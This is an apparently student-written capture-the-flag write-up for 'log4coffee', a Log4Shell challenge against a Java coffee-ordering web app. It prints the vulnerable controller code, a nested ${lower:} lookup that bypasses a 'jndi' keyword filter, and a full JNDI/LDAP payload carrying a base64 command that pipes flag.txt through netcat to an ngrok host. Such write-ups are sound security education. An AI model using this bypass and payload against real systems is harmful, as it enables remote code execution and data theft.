# log4coffee

## by *kaipan*

### Description

This is a challenge based on the recent *log4j* logging tool exploit (called *log4shell*). Describing what this vulnerability/exploit is is too much work, so if you want to know how it works then you can just go to this link and read up on it: https://www.lunasec.io/docs/blog/log4j-zero-day/. The gist of it is that you can get Remote Code Execution (RCE) by logging a certain string (with a specific format). We are given a website and its source code so we need to discover how we can use the *log4shell* exploit to retrieve the flag.

### Discovering and Understanding the Vulnerability

We are given the source code in a zip file. We need to extract the contents of the zip file and navigate to the following directory: **log4coffee > coffeeCorporation > src > main > java > com > corporate > coffeeCorporation**. Here we see five source code files. The only one that matters (that does the logging and thus is vulnerable to the logging exploit *log4shell*) is **CoffeeController.java**. The important code for the file is as follows:

```java
@RestController
public class CoffeeController {

  private static final Logger logger = LogManager.getLogger("OrderLog");
  private final AtomicLong orderID = new AtomicLong();

  @GetMapping("/available")
  public ArrayList<Coffee> available(){
    int size = 3;
    ArrayList<Coffee> inventory = new ArrayList<Coffee>(size);
    inventory.add(new Coffee(0, 23, "Light Roast"));
    inventory.add(new Coffee(1, 49, "Medium Roast"));
    inventory.add(new Coffee(2, 94, "rgb(0,0,0) Roast"));
    return inventory;
  }

  @PostMapping("/order")
  public String orderUp(@ModelAttribute OrderForm order, Model model){
    String comments = order.getComments();

    String response;

    // ok fixed log4shell vuln, app is now secure.
    if (!(comments.contains("jndi"))){
      ByteArrayOutputStream baos = new ByteArrayOutputStream();
      PrintStream ps = new PrintStream(baos);
      PrintStream old = System.out;
      System.setOut(ps);
      logger.info(String.format(">>> Order ID: %d, QTY: %d, Notes: %s", orderID.incrementAndGet(), order.getQty(), comments));
      System.out.flush();
      System.setOut(old);
      response = baos.toString().split(">>>", 2)[1];
    } else {
      response = "Haha! Nice try hacker--but my web-application is *super secure*!";
    }

    return response;
  }
}
```

The first part of the code, the function `available`, just prints out the coffees and their respective IDs. This is purely UI so we don't really care. The `orderUp` function is what we care about, since this function gets run when we submit our order on the website. We see that there is a logging operation in the function, specifically the `logger.info()` call. This means that there is a *log4shell* exploit that we can take advantage of through this logging. Of course we see the problem here; there is an apparent "fix" stated in the comments, and upon closer inspection we see that there is a condition that checks if the comment, which is where we enter the string that gets logged and thus is where we execute the *log4j* attack through entering the special formatted string, actually checks for a part of the formatted string. If the comment has "jndi", which is the *Java Naming and Directory Interface* that we normally use in the logger to execute the *log4shell* attack, then it will not log it and instead print a message. We can get around this filter though and still execute the exploit (the specific format that the string we log for *log4shell* is `${jndi:ldap//ip/end}`, which is in the format for lookup/variable substitution for *log4j*).

We can bypass the "jdni" filter by recreating "jdni" in a roundabout way with *log4j* variable substitution. These variable substitution expressions are encased in `${}`. To save you all the trouble, we can recreate "jdni" at runtime with the `lower` lookup/variable substitution which just converts the arguments in the `${}` expression to lower case. We just need to split up "jdni" and put them inside of the `lower` lookups. This way, the actual string is not "jdni", and so it passes the conditional and we get to the logging; once we get to the logging, log4j interprets these lookups dynamically and substitutes the `${}` expressions to make lowercase "jd" and "ni". Thus, when put together, we get back "jdni" at runtime when the logger runs, but it is not "jdni" when the comment string is checked in the code before getting to the logger call in the code, so we end up bypassing the "jdni" filter. Pog!

Our *log4j* payload should look something like this now to bypass the filter:

`${${lower:jn}${lower:di}:ldap//ip/end}` 

** Note that we can nest lookup expressions inside one another, thus this recreates the `${jndi:ldap//ip/end}` format needed to do the exploit

The hard part is now done. We just need to fill in the rest of the string with the server LDAP server that was setup by a coach and we can get the LDAP server to redirect us to another server that creates a malicious class and serves it back to the web app. The web app then runs the malicious class with our code that reads the flag and exfiltrates it to our own listening server. Basically, our *log4j* payload that runs on the web app gets the web app to run malicious code that reads the flag and sends it to our own server.

### I Literally Hate ngrok and Setting Up a Listening Server

In theory, setting up a listening server should be pretty easy. Except my VM and the challenge was having bruh moments that made it infinitely more challenging than it needed to be (hostname resolution issues and the LDAP server being down for everyone lol). But I'll just describe the working steps rather than vent my frustrations.

First we setup a listening server, since we will have the web app send the flag after it gets read (through our malicious class) to this listening server for us to retrieve and read the flag. We set up a listening server using `netcat` on any open port with the command `nc -lvp <port>`. I used port 5299.

Now we have to go the extra step to setup **ngrok**, which forwards outside traffic to its endpoint to our localhost or something like that. I don't know exactly why we need it since I was frustrated from the LDAP server being down (my payload was correct except the challenge infrastructure wasn't working) and I was just trying a whole bunch of different things and I ended up not paying much attention to the explanation for **ngrok**. I didn't know if it was the challenge infrastructure or the my own listening server/network so I was just trying to figure that out and **ngrok** was an annoyance on top of all of this. Can't forget the fact that you need to make an account for it as well, and I doubt I'll use **ngrok** again.

So now we have this tunnel to local host, and this tunnel/address from **ngrok** is where we are going to send the flag data to, and then the tunnel forwards this data to our listening server set up by `netcat`. We download and unzip **ngrok**, we add the authentication key or whatever with a command on their website, and then we hookup **ngrok** to point to our listening server on port 5299 using the TCP protocol with a command on the **ngrok** website as well but changing the port and protocol.

**ngrok** gives us an endpoint to send our data to when we start the **ngrok** tunnel, and now we can create our command to read the flag and send it to this endpoint 2.tcp.ngrok.io:10176. So our payload, since it executes on the infrastructure of the web app, must contain the flag. The commands we run are under this assumption (we assume command gets run in directory of the web app on the web app infrastructure which has the flag). Thus, we can just `cat flag.txt` and then send it using `netcat` with the pipe operator to our **ngrok** endpoint which forwards it to our listening server. The final command is this:

`cat flag.txt | nc 2.tcp.ngrok.io 10176`

The LDAP server has a route that creates a payload based on base64 encoded commands, so we need to encode the above command in base64 and add it to our *log4j* payload. In base64, the command is: `Y2F0IGZsYWcudHh0IHwgbmMgMi50Y3Aubmdyb2suaW8gMTAxNzY=`.

Now we can build the final payload which contains the filter bypass, the LDAP server already set up, and the route which creates a malicious class based on base64 encoded commands. It is shown below:

`${${lower:jn}${lower:di}:ldap://log4j.ctf-league.osusec.org:1389/Basic/Command/Base64/Y2F0IGZsYWcudHh0IHwgbmMgMi50Y3Aubmdyb2suaW8gMTAxNzY=}`

The LDAP server was STILL DOWN when I figured this out, and somebody ended up getting first blood right when the server went back up, so I basically got scammed trying out alternatives when it was just the LDAP server. I'm still kinda salty if you can't tell right now.

Regardless, we just put the command in the comments field, submit the form on the web app, and then we just check our listening server which should retrieve the flag data!

### Flag

`osu{m0r3_l1k3_l0g_4_fl@g}`